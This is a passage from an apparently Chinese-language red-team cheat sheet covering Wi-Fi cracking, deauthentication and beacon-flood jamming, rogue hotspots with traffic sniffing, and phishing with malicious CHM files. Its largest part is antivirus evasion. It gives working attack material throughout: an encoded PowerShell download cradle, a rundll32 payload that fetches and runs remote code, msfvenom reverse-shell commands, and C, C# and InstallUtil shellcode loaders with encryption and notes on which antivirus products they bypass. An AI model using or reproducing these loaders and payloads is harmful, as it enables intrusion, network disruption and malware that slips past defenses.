&gt;create function system(cstring) returns int AS &#39;/lib64/libc.so.6&#39;, &#39;system&#39; language C strict;
&gt;select system(&#39;id&#39;);
</code></pre>
<h2 id="近源攻击"><a href="#近源攻击" class="headerlink" title="近源攻击"></a>近源攻击</h2><h3 id="WI-FI破解"><a href="#WI-FI破解" class="headerlink" title="WI-FI破解"></a>WI-FI破解</h3><h4 id="wifite"><a href="#wifite" class="headerlink" title="wifite"></a>wifite</h4><pre><code>Kali下工具wifite，加载网卡，开启监听模式，#airmon-ng check kill
#airmon-ng start wlan1
安装hcxtools v4.2.0或更高版本，hcxdumptool v4.2.0或更高版本
#apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev
#git clone https://github.com/ZerBea/hcxtools
#cd hcxtools
#make
#make install 
#git clone https://github.com/ZerBea/hcxdumptool
#cd hcxdumptool
#make
#make install
#wifite –-dict /root/Desktop/wordlist.txt  加载
</code></pre>
<h4 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h4><pre><code>#airmon-ng start wlan0 开启监听模式
#airodump-ng wlan0mon  查看数据包
#airodump-ng –c 1 –bssid APmac –w name wlan1mon保存某AP数据包
#aireplay-ng –deauth 10 –a APmac wlan0mon  deauth攻击
#aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon deauth攻击某个设备直至获取handshake(握手包)
#airmon-ng stop wlan0mon  关闭监听模式
#aircrack-ng –w wordlist.txt name.cap 指定字典破解密码
</code></pre>
<h3 id="钓鱼网络"><a href="#钓鱼网络" class="headerlink" title="钓鱼网络"></a>钓鱼网络</h3><h4 id="Hostapd"><a href="#Hostapd" class="headerlink" title="Hostapd"></a>Hostapd</h4><pre><code>#apt install hostapd dnsmasq
#cd /etc/hostapd
#vim open.conf 创建无加密热点
Interface=wlan1
Ssid=FreeWIFI
Driver=nl80211
Channel=1
Hw_mode=g

#vim /etc/dnsmasq.conf
Dhcp-range=10.0.0.1, 10.0.0.255,12h
Interface=wlan1

#systemctl restart dnsmasq
消除网卡限制
#nmcli radio wifi off
#rfkill unblock wlan
#ifconfig wlan1 10.0.0.1/24
#hostapd open.conf
嗅探
#sysctl –w net.ipv4.ip_forward=1
#iptables –t nat –A POSTROUTING –o 网卡 –j MASQUERADE
#bettercap –iface wlan1
#net.show
#net.sniff on
#driftnet –i wlan1
</code></pre>
<h4 id="Hostapd-wpe"><a href="#Hostapd-wpe" class="headerlink" title="Hostapd-wpe"></a>Hostapd-wpe</h4><pre><code>#apt install hostapd-wpe
#vim /etc/hostapd-wpe/hostapd-wpe.conf
配置interface=wlan1
Ssid=
Channel=
证书修改
#cd /etc/hostapd-wpe/certs/
文件ca.cnf server.cnf client.cnf
修改countrName stateOrProvinceName localityName …….
#rm –rf *.pem *.der *.csr *.crt *.key *.p12 serial* index.txt*
#make clean
#./bootstrap
#make install
执行创建热点
#hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
获取到密码时使用asleep破解
#asleap –C Challenge值 –R response值 –W 字典文件
</code></pre>
<h3 id="无线干扰"><a href="#无线干扰" class="headerlink" title="无线干扰"></a>无线干扰</h3><h4 id="Beacon-flood"><a href="#Beacon-flood" class="headerlink" title="Beacon flood"></a>Beacon flood</h4><pre><code>需切换网卡为监听模式
#airmon-ng start wlan1
创建大量虚假热点Mdk3 mon0 b
#mdk3 wlan1mon b -f /root/wifi.txt -a -s 1500
</code></pre>
<h4 id="Deauth-flood"><a href="#Deauth-flood" class="headerlink" title="Deauth flood"></a>Deauth flood</h4><pre><code>针对AP
#airmon-ng start wlan1
#aireplay-ng –deauth 10 –a AP’s mac address mon0
针对AP内设备
#airmon-ng start wlan1       将网卡置为监听模式
#airodump-ng wlan1mon –bssid 目标ap的ssid
#aireplay-ng -0 0 -a ap的ssid -c AP的ssid wlan0mon 开始攻击
</code></pre>
<h4 id="Mdk3-destruction"><a href="#Mdk3-destruction" class="headerlink" title="Mdk3 destruction"></a>Mdk3 destruction</h4><pre><code>针对范围内
#mdk3 wlan1mon d
针对AP
#airodump-ng wlan1mon
#mdk3 wlan1mon a -a APmac 发起攻击
黑名单
#mdk3 wlan1mon d –c 信道 –b /blacklist.txt.
#mdk3 wlan1mon  b -n test -w -g -c 1 -s 200
</code></pre>
<h4 id="WiFi芯片esp8266"><a href="#WiFi芯片esp8266" class="headerlink" title="WiFi芯片esp8266"></a>WiFi芯片esp8266</h4><h4 id="Mdk4"><a href="#Mdk4" class="headerlink" title="Mdk4"></a>Mdk4</h4><pre><code>#mdk4 wlan0mon d
</code></pre>
<h4 id="CVE-2018-4407"><a href="#CVE-2018-4407" class="headerlink" title="CVE-2018-4407"></a>CVE-2018-4407</h4><pre><code>Scapy
send(IP(dst=&quot;192.168.1.132&quot;,options=[IPOption(&quot;A&quot;*8)])/TCP(dport=2323,options=[(19, &quot;1&quot;*18),(19, &quot;2&quot;*18)]))
Apple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备）
Apple macOS High Sierra（受影响的最高版本为10.13.6）：所有设备（通过安全更新2018-001修复）
Apple macOS Sierra（受影响的最高版本为10.12.6）：所有设备（通过安全更新2018-005中修复）
Apple OS X El Capitan及更早版本：所有设备
</code></pre>
<h4 id="绕过mac地址认证"><a href="#绕过mac地址认证" class="headerlink" title="绕过mac地址认证"></a>绕过mac地址认证</h4><h5 id="Ifconfig"><a href="#Ifconfig" class="headerlink" title="Ifconfig"></a>Ifconfig</h5><pre><code>#ifconfig wlan1 down
#ifconfig wlan1 hw ether xx:xx:xx:xx:xx:xx
#ifconfig wlan1 up
</code></pre>
<h5 id="Macchanger"><a href="#Macchanger" class="headerlink" title="Macchanger"></a>Macchanger</h5><pre><code>#macchanger –m xx:xx:xx:xx:xx:xx wlan1
#macchanger –r wlan1
</code></pre>
<h3 id="BadUSB"><a href="#BadUSB" class="headerlink" title="BadUSB"></a>BadUSB</h3><h3 id="克隆卡"><a href="#克隆卡" class="headerlink" title="克隆卡"></a>克隆卡</h3><h3 id="蓝牙"><a href="#蓝牙" class="headerlink" title="蓝牙"></a>蓝牙</h3><h2 id="鱼叉式攻击"><a href="#鱼叉式攻击" class="headerlink" title="鱼叉式攻击"></a>鱼叉式攻击</h2><h3 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h3><pre><code>假冒的内部域名
假冒的外部域名
近似域名
被黑账户
群发/特定发
虚构情景/恶意连接/恶意文件
</code></pre>
<h4 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h4><h5 id="CVE-2017-11882"><a href="#CVE-2017-11882" class="headerlink" title="CVE-2017-11882"></a>CVE-2017-11882</h5><pre><code>Microsoft Office 2007 SP3 / 2010 SP2 / 2013 SP1 / 2016
</code></pre>
<h5 id="CVE-2017-0199"><a href="#CVE-2017-0199" class="headerlink" title="CVE-2017-0199"></a>CVE-2017-0199</h5><pre><code>Microsoft Office 2007 SP3 / 2010 SP2 / 2013 SP1 / 2016，Vista SP2，Server 2008 SP2，Windows 7 SP1，Windows 8.1
</code></pre>
<h5 id="CVE-2012-0158"><a href="#CVE-2012-0158" class="headerlink" title="CVE-2012-0158"></a>CVE-2012-0158</h5><pre><code>Microsoft Office 2003 SP3、2007 SP2和SP3，以及2010 Gold和SP1；Office 2003 Web组件SP3；SQL Server 2000 SP4、2005 SP4和2008 SP2，SP3和R2; BizTalk Server 2002 SP1；Commerce Server 2002 SP4、2007 SP2和2009 Gold和R2; Visual FoxPro 8.0 SP1和9.0 SP2; 和Visual Basic 6.0
</code></pre>
<h5 id="CVE-2017-0143"><a href="#CVE-2017-0143" class="headerlink" title="CVE-2017-0143"></a>CVE-2017-0143</h5><pre><code>Microsoft Windows Vista SP2；Windows Server 2008 SP2和R2 SP1; Windows 7 SP1；Windows 8.1; Windows Server 2012 Gold和R2；Windows RT 8.1；Windows 10 Gold，1511和1607；以及 和Windows Server 2016
OFFICE文档/ PDF文件
</code></pre>
<h4 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h4><h4 id="文档文件的伪造"><a href="#文档文件的伪造" class="headerlink" title="文档文件的伪造"></a>文档文件的伪造</h4><h4 id="扩展名-图标"><a href="#扩展名-图标" class="headerlink" title="扩展名/图标"></a>扩展名/图标</h4><h4 id="捆绑"><a href="#捆绑" class="headerlink" title="捆绑"></a>捆绑</h4><h4 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h4><h4 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h4><h4 id="CHM"><a href="#CHM" class="headerlink" title="CHM"></a>CHM</h4><pre><code>使用编译的HTML文件加载恶意代码。
使用EasyCHM对html进行编译，在html文件中插入恶意代码。
使用MSF生成powershell格式的web_delivery模块
使用Rundll32配合MyJSRAT实施运行无弹窗
</code></pre>
<p><img src="44.png" alt="image"></p>
<pre><code>把命令base编码避免特殊符号
</code></pre>
<p><img src="45.png" alt="image"></p>
<pre><code>执行语句编码后
&gt;powershell -ep bypass -enc JABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAQgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAKACQAQgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoASQBFAFgAIAAkAEIALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADAANwA6ADgAMAA4ADAALwBQAEsAUQBOAEUAYgAnACkAOwAKAA==
通过JSRat执行powershell上线命令
https://github.com/Ridter/MyJSRat
&gt;python MyJSRat.py -i 192.168.1.107 -p 8888 -c &quot;powershell -ep bypass -enc JABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAQgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAKACQAQgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoASQBFAFgAIAAkAEIALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADAANwA6ADgAMAA4ADAALwBQAEsAUQBOAEUAYgAnACkAOwAKAA==&quot;
</code></pre>
<p><img src="46.png" alt="image"></p>
<pre><code>访问http://ip/wtf复制利用语句到html文件后编译
</code></pre>
<p><img src="47.png" alt="image"></p>
<pre><code>&lt;PARAM name=&quot;Item1&quot; value=&#39;,rundll32.exe,javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.0.107:8888/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&#39;&gt;
</code></pre>
<p><img src="48.png" alt="image"></p>
<pre><code>正常打开CHM文件，无弹窗上线。
</code></pre>
<p><img src="49.png" alt="image"></p>
<h3 id="钓鱼链接"><a href="#钓鱼链接" class="headerlink" title="钓鱼链接"></a>钓鱼链接</h3><h4 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h4><h4 id="结合恶意文档或程序"><a href="#结合恶意文档或程序" class="headerlink" title="结合恶意文档或程序"></a>结合恶意文档或程序</h4><h4 id="短URL"><a href="#短URL" class="headerlink" title="短URL"></a>短URL</h4><h4 id="结合水坑攻击"><a href="#结合水坑攻击" class="headerlink" title="结合水坑攻击"></a>结合水坑攻击</h4><h4 id="相似域名"><a href="#相似域名" class="headerlink" title="相似域名"></a>相似域名</h4><h4 id="域名窃取"><a href="#域名窃取" class="headerlink" title="域名窃取"></a>域名窃取</h4><h3 id="第三方服务鱼叉"><a href="#第三方服务鱼叉" class="headerlink" title="第三方服务鱼叉"></a>第三方服务鱼叉</h3><pre><code>通过社交软件建立关系，如男女朋友，师父徒弟，HR，寻求业务等进行钓鱼攻击
</code></pre>
<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><h2 id="MSF免杀"><a href="#MSF免杀" class="headerlink" title="MSF免杀"></a>MSF免杀</h2><h3 id="nps-payload"><a href="#nps-payload" class="headerlink" title="nps_payload"></a>nps_payload</h3><pre><code>&gt;python nps_payload.py正常生成
&gt;msfconsole -r msbuild_nps.rc开启监听
&gt;%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe xx.xml
&gt;wmiexec.py &lt;USER&gt;:&#39;&lt;PASS&gt;&#39;@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml
正常执行结束进程msbuild会失去会话，以下保存bat执行
获得session后立刻迁移进程
@echo off
echo [*] Please Wait, preparing software ..
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Microsoft.NET\Framework\v4.0.30319\xxx.xml
exit
</code></pre>
<h3 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h3><pre><code>&gt;set EnableStageEncoding true
&gt;set stageencoder x86/fnstenv_mov 编码进行免杀
&gt;set stageencodingfallback false
&amp;
&gt;msfvenom --list encoders列出编码器
</code></pre>
<h3 id="c-c-源码免杀"><a href="#c-c-源码免杀" class="headerlink" title="c/c++源码免杀"></a>c/c++源码免杀</h3><pre><code>&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f c -o 1.c
-i编码20次
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
</code></pre>
<h4 id="指针执行"><a href="#指针执行" class="headerlink" title="指针执行"></a>指针执行</h4><pre><code>unsigned char buf[] =
&quot;shellcode&quot;;
#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //windows控制台程序不出黑窗口
main()
&#123;
    ( (void(*)(void))&amp;buf)();
&#125;
使用vc6.0组建编译后在靶机执行
</code></pre>
<p><img src="50.png" alt="image"></p>
<pre><code>当前过不了火绒，360动态静态可过
</code></pre>
<h4 id="申请动态内存"><a href="#申请动态内存" class="headerlink" title="申请动态内存"></a>申请动态内存</h4><pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //windows控制台程序不出黑窗口
unsigned char buf[] =
&quot;shellcode&quot;;
main()
&#123;
    char *Memory;
    Memory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, buf, sizeof(buf));
    ((void(*)())Memory)();
&#125;
</code></pre>
<h4 id="嵌入汇编"><a href="#嵌入汇编" class="headerlink" title="嵌入汇编"></a>嵌入汇编</h4><pre><code>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#pragma comment(linker, &quot;/section:.data,RWE&quot;)
unsigned char shellcode[] =&quot;&quot;;
void main()
&#123;
    __asm
    &#123;
        mov eax, offset shellcode
        jmp eax
    &#125;
&#125;
</code></pre>
<h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h4><pre><code>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
unsigned char buf[] =&quot;&quot;;
void main()
&#123;
 ((void(WINAPI*)(void))&amp;buf)();
&#125;
</code></pre>
<h4 id="汇编花指令"><a href="#汇编花指令" class="headerlink" title="汇编花指令"></a>汇编花指令</h4><pre><code>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#pragma comment(linker, &quot;/section:.data,RWE&quot;)
unsigned char shellcode[] =&quot;&quot;;
void main()
&#123;
        __asm
    &#123;
        mov eax, offset shellcode
        _emit 0xFF  
        _emit 0xE0
    &#125;
&#125;
</code></pre>
<h4 id="XOR加密"><a href="#XOR加密" class="headerlink" title="XOR加密"></a>XOR加密</h4><pre><code>https://github.com/Arno0x/ShellcodeWrapper安装
生成raw格式木马
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f raw -o shell.raw
</code></pre>
<p><img src="51.png" alt="image"></p>
<pre><code>加密
&gt; python shellcode_encoder.py -cpp -cs -py shell.raw thisiskey xor
生成的py文件使用py2exe编译执行
生成的cs文件使用csc.exe编译执行
生成的cpp文件使用vc6.0编译，去掉预编译头编译执行
</code></pre>
<p><img src="52.png" alt="image"></p>
<h4 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h4><pre><code>目前过火绒，不过360，可组合一下
Vs新建c++控制台程序
右键属性-》将MFC的使用选为在静态库中使用MFC
生成c格式shellcode粘贴进remote inject.cpp
</code></pre>
<p><img src="53.png" alt="image"></p>
<pre><code>生成项目
能成功上线，并开启calc进程
</code></pre>
<p><img src="54.png" alt="image"><br><img src="55.png" alt="image"></p>
<h4 id="加载器免杀"><a href="#加载器免杀" class="headerlink" title="加载器免杀"></a>加载器免杀</h4><h5 id="shellcode-launcher"><a href="#shellcode-launcher" class="headerlink" title="shellcode_launcher"></a>shellcode_launcher</h5><pre><code>https://github.com/clinicallyinane/shellcode_launcher/
生成payload(raw)
&gt;msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f raw -o shellcode.raw
加载器加载
&gt;shellcode_launcher.exe -i shellcode.raw
</code></pre>
<h5 id="SSI加载"><a href="#SSI加载" class="headerlink" title="SSI加载"></a>SSI加载</h5><pre><code>https://github.com/DimopoulosElias/SimpleShellcodeInjector
生成payload(c)
&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f c -o shellcode.c
执行
&gt;cat shellcode.c |grep -v unsigned|sed &quot;s/\&quot;\\\x//g&quot;|sed &quot;s/\\\x//g&quot;|sed &quot;s/\&quot;//g&quot;|sed &#39;:a;N;$!ba;s/\n//g&#39;|sed &quot;s/;//g&quot;
</code></pre>
<p><img src="56.png" alt="image"></p>
<pre><code>MSF监听
可使用minGW自行编译
&gt;gcc SimpleShellcodeInjector.c -o xxx.exe
执行
&gt;xxx.exe +生成的编码
</code></pre>
<h3 id="c-源码免杀"><a href="#c-源码免杀" class="headerlink" title="c#源码免杀"></a>c#源码免杀</h3><h4 id="直接编译"><a href="#直接编译" class="headerlink" title="直接编译"></a>直接编译</h4><pre><code>生成payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
MSF启动监听
Payload粘贴到位置
using System;
using System.Runtime.InteropServices;
namespace TCPMeterpreterProcess
&#123;
    class Program
    &#123;
        static void Main(string[] args)
        &#123;
            byte[] shellcode = new byte[] &#123;payload here&#125;;
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        &#125;
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport(&quot;kernel32&quot;)]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);
        [DllImport(&quot;kernel32&quot;)]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern IntPtr GetModuleHandle(
            string moduleName
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 GetProcAddress(
            IntPtr hModule,
            string procName
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 LoadLibrary(
            string lpFileName
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 GetLastError();
    &#125;
&#125;
Visual studio创建C#.net framework控制台程序编译可过杀软
</code></pre>
<h4 id="加密处理"><a href="#加密处理" class="headerlink" title="加密处理"></a>加密处理</h4><pre><code>生成payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
粘贴payload后编译加密
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
namespace Payload_Encrypt_Maker
&#123;
    class Program
    &#123;
        // 加密密钥，可以更改，加解密源码中保持KEY一致就行
        static byte[] KEY = &#123; 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 &#125;;
        static byte[] IV = &#123; 0x00, 0xcc, 0x00, 0x00, 0x00, 0xcc &#125;;
        static byte[] payload = &#123; payload here &#125;;    // 替换成MSF生成的shellcode
        private static class Encryption_Class
        &#123;
            public static string Encrypt(string key, string data)
            &#123;
                Encoding unicode = Encoding.Unicode;
                return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
            &#125;
            public static byte[] Encrypt(byte[] key, byte[] data)
            &#123;
                return EncryptOutput(key, data).ToArray();
            &#125;
            private static byte[] EncryptInitalize(byte[] key)
            &#123;
                byte[] s = Enumerable.Range(0, 256)
                .Select(i =&gt; (byte)i)
                .ToArray();
                for (int i = 0, j = 0; i &lt; 256; i++)
                &#123;
                    j = (j + key[i % key.Length] + s[i]) &amp; 255;
                    Swap(s, i, j);
                &#125;
                return s;
            &#125;
            private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)
            &#123;
                byte[] s = EncryptInitalize(key);
                int i = 0;
                int j = 0;
                return data.Select((b) =&gt;
                &#123;
                    i = (i + 1) &amp; 255;
                    j = (j + s[i]) &amp; 255;
                    Swap(s, i, j);
                    return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);
                &#125;);
            &#125;
            private static void Swap(byte[] s, int i, int j)
            &#123;
                byte c = s[i];
                s[i] = s[j];
                s[j] = c;
            &#125;
        &#125;
        static void Main(string[] args)
        &#123;
            byte[] result = Encryption_Class.Encrypt(KEY, payload);
            int b = 0;
            for (int i = 0; i &lt; result.Length; i++)
            &#123;
                b++;
                if (i == result.Length + 1)
                &#123; Console.Write(result[i].ToString()); &#125;
                if (i != result.Length) &#123; Console.Write(result[i].ToString() + &quot;,&quot;); &#125;
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<p><img src="57.png" alt="image"></p>
<pre><code>编译解密
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace NativePayload_Reverse_tcp
&#123;
    public class Program
&#123;
        public static void Main()
        &#123;
            Shellcode.Exec();
  &#125;
&#125;
class Shellcode
&#123;
  public static void Exec()
  &#123;
    string Payload_Encrypted;
    Payload_Encrypted = &quot;payload here&quot;;
    string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(&#39;,&#39;);
    byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
    for (int i = 0; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)
    &#123;
      byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
      _X_to_Bytes[i] = current;
    &#125;
    // 解密密钥，可以更改，加解密源码中保持KEY一致就行
            byte[] KEY = &#123; 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 &#125;;
            byte[] MsfPayload = Decrypt(KEY, _X_to_Bytes);
            // 加载shellcode
            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);
            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);
            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);
            Thread.Sleep(2000);
        &#125;
        public static byte[] Decrypt(byte[] key, byte[] data)
        &#123;
            return EncryptOutput(key, data).ToArray();
        &#125;
        private static byte[] EncryptInitalize(byte[] key)
        &#123;
            byte[] s = Enumerable.Range(0, 256)
            .Select(i =&gt; (byte)i)
            .ToArray();
            for (int i = 0, j = 0; i &lt; 256; i++)
            &#123;
                j = (j + key[i % key.Length] + s[i]) &amp; 255;
                Swap(s, i, j);
            &#125;
            return s;
        &#125;
        private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)
        &#123;
            byte[] s = EncryptInitalize(key);
            int i = 0;
            int j = 0;
            return data.Select((b) =&gt;
            &#123;
                i = (i + 1) &amp; 255;
                j = (j + s[i]) &amp; 255;
                Swap(s, i, j);
                return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);
                &#125;);
        &#125;
        private static void Swap(byte[] s, int i, int j)
        &#123;
            byte c = s[i];
            s[i] = s[j];
            s[j] = c;
        &#125;
        [DllImport(&quot;kernel32.dll&quot;)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport(&quot;kernel32.dll&quot;)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    &#125;
&#125;
</code></pre>
<h4 id="XOR-AES编码"><a href="#XOR-AES编码" class="headerlink" title="XOR/AES编码"></a>XOR/AES编码</h4><pre><code>与上文xor加密类似
</code></pre>
<h4 id="CSC-InstallUtil"><a href="#CSC-InstallUtil" class="headerlink" title="CSC+InstallUtil"></a>CSC+InstallUtil</h4><pre><code>生成payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
Payload粘贴到InstallUtil-Shellcode.cs中使用csc编译
</code></pre>
<p><img src="58.png" alt="image"></p>
<pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:C:\Users\y\Desktop\shell.exe C:\Users\y\Desktop\InstallUtil-ShellCode.cs
</code></pre>
<p><img src="59.png" alt="image"></p>
<pre><code>执行
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\shell.exe
</code></pre>
<h3 id="Python源码免杀"><a href="#Python源码免杀" class="headerlink" title="Python源码免杀"></a>Python源码免杀</h3><h4 id="pyinstaller加载C代码编译"><a href="#pyinstaller加载C代码编译" class="headerlink" title="pyinstaller加载C代码编译"></a>pyinstaller加载C代码编译</h4><pre><code>生成C格式payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c
